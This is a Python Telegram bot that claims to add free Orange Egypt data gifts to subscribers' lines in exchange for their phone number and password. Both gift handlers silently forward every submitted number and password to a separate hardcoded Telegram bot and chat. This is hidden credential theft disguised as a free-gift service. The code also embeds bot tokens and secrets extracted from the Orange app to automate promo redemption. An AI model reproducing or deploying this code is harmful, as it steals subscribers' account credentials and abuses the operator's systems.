from telebot import types
import telebot
import hashlib
import requests

bot = telebot.TeleBot("7571964553:AAFYhUASiYhmj-_NcXOESyJP5zXlzPfEqJ8")

@bot.message_handler(commands=["start"])
def start(message):
    user = message.from_user.first_name
    bot.send_photo(message.chat.id, photo="https://ibb.co/hLjb5vg", caption=f"""مرحبا {user}
    -أنا بوت تم برمجتي بواسطة @a_b_d_o_7777
    -مهمتي هي إضافة هدايا لخطوط اورانج
    -الهدايا المتوفرة حاليا في البوت:
       
        -[1]- 
       
        -[2]- 200 
        
-للحصول علي هدية 500 ميجا اورانج تجدد شهريا ارسل الرقم والباسورد بهذا الشكل
/500 number:passowrd
-للحصول علي هدية 200 ميجا اورانج تجدد يوميا ارسل الرقم والباسورد بهذا الشكل
/200 number:passowrd
    """)

@bot.message_handler(commands=["500"])
def start(message):
    m = message.text.split(" ")
    if len(m) == 2 and ":" in m[1]:
        number, pas = m[1].split(":")
        tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={number,pas}"
        i = requests.post(tlg)
        headers = {
    'net-msg-id': '02aeafda014687d17002292845071009',
    'x-microservice-name': 'APMS',
    'Content-Type': 'application/json; charset=UTF-8',
    # 'Content-Length': '170',
    'Host': 'services.orange.eg',
    'Connection': 'Keep-Alive',
    # 'Accept-Encoding': 'gzip',
    'User-Agent': 'okhttp/3.14.9',}
        data = '{"appVersion":"7.3.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","isAndroid":true,"password":"%s"}'%(number,pas)
        r1 = requests.post('https://services.orange.eg/SignIn.svc/SignInUser', headers=headers, data=data)
        if "Success" in r1.text:
        	bot.send_message(message.chat.id,text="جاري اضافة الهديه لخطك")
        	userid = r1.json()["SignInUserResult"]["UserData"]["UserID"]
        	headers = {
	    'net-msg-id': 'd8fb9a08007360d17002306544251017',
	    'x-microservice-name': 'APMS',
	    'Content-Type': 'application/json; charset=UTF-8',
	    'Host': 'services.orange.eg',
	    'Connection': 'Keep-Alive',
	    'User-Agent': 'okhttp/3.14.9',}
        	data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        	r2 = requests.post('https://services.orange.eg/GetToken.svc/GenerateToken', headers=headers, data=data)
        	token = r2.json()["GenerateTokenResult"]["Token"]
        	h = hashlib.sha256((token+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
        	htv=h.upper()
        	headers = {
	    "_ctv": token,
	    "_htv": htv,
	    "isEasyLogin": "false",
	    "UserId": userid,
	    "Content-Type": "application/json; charset=UTF-8",
	    "Host": "services.orange.eg",
	    "Connection": "Keep-Alive",
	    "Accept-Encoding": "gzip",
	    "User-Agent": "okhttp/3.12.0"
	}
	
        	data = {
	    "Language": "ar",
	    "OSVersion": "Android12",
	    "PromoCode": "رمضان كريم",
	    "dial": number,
	    "password": pas,
	    "Channelname": "MobinilAndMe",
	    "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF"
	}
        	r3 = requests.post("https://services.orange.eg/APIs/Promotions/api/CAF/Redeem", headers=headers, json=data)
        	if "انت استخدمت البرومو كود النهاردة" in r3.text:
        		bot.send_message(message.chat.id,text="انت استخدمت العرض قبل كده حاول ف يوم تاني")
        	else:
        		bot.send_message(message.chat.id,text="تمت اضافة العرض بنجاح✅")
        else:
        	bot.send_message(message.chat.id,text="الرقم او الباسورد غلط")
    else:
    	bot.send_message(message.chat.id, text="ادخل المعلومات بشكل صحيح")
#________________________________________
@bot.message_handler(commands=["200"])
def start(message):
    m = message.text.split(" ")
    if len(m) == 2 and ":" in m[1]:
        number, pas = m[1].split(":")
        tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={number,pas}"
        i = requests.post(tlg)
        headers = {
        'net-msg-id': 'd8fb9a08007360d17002306544251017',
        'x-microservice-name': 'APMS',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'services.orange.eg',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.14.9',}
        data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        r1 = requests.post('https://services.orange.eg/GetToken.svc/GenerateToken', headers=headers, data=data)
        token = r1.json()["GenerateTokenResult"]["Token"]
        h = hashlib.sha256((token+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk').encode()).hexdigest()
        htv=h.upper()
        headers = {
        '_ctv': token,
        '_htv': htv,
        'AppVersion': '7.3.0',
        'OsVersion': '12',
        'IsAndroid': 'true',
        'IsEasyLogin': 'false',
        'net-msg-id': '11d3c78f012363d17101861927381057',
        'x-microservice-name': 'APMS',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'services.orange.eg',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.14.9',
        }
    
        data = '{"ChannelName":"MobinilAndMe","ChannelPassword":"ig3yh*mk5l42@oj7QAR8yF","Dial":"%s","Password":"%s"}'%(number,pas)
    
        r1 = requests.post('https://services.orange.eg/APIs/Profile/api/BasicAuthentication/Generate', headers=headers, data=data)
        if "Token" in r1.text:
            bot.send_message(message.chat.id,text="تم تسجيل الدخول جاري فحص الهديه🚀")
            tok = r1.json()["Token"]
            url = "https://services.orange.eg/APIs/Ramadan2024/api/RamadanOffers/Fawazeer/Submit"
            headers = {
            "Host": "services.orange.eg",
            "Connection": "keep-alive",
            "Content-Length": "258",
            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
                "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.64 Mobile Safari/537.36",
            "sec-ch-ua-platform": "\"Android\"",
            "Origin": "https://services.orange.eg",
            "X-Requested-With": "com.orange.mobinilandme",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": f"https://services.orange.eg/Pages/fawazeer/game?dial={number}&token={tok}&language=ar&offerId=80",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
        }
        
            data = {
            "Dial":number,
            "Language": "ar",
            "Token": tok,
            "Answers": [
                {"QuestionId": 8, "AnswerId": 49},
                {"QuestionId": 9, "AnswerId": 54},
                {"QuestionId": 10, "AnswerId": 129},
                {"QuestionId": 11, "AnswerId": 134},
                {"QuestionId": 12, "AnswerId": 135},
            ],
        }
        
            r2 = requests.post(url, json=data, headers=headers)
            if "FawazeerSuccess" in r2.text:
               bot.send_message(message.chat.id, text="تم ارسال الهديه بنجاح✅")
            elif "AlreadyRedeemedGiftToday" in r2.text:
                bot.send_message(message.chat.id,text="انت استفدت بالعرض انهارده حاول تاني بكره")



bot.polling()
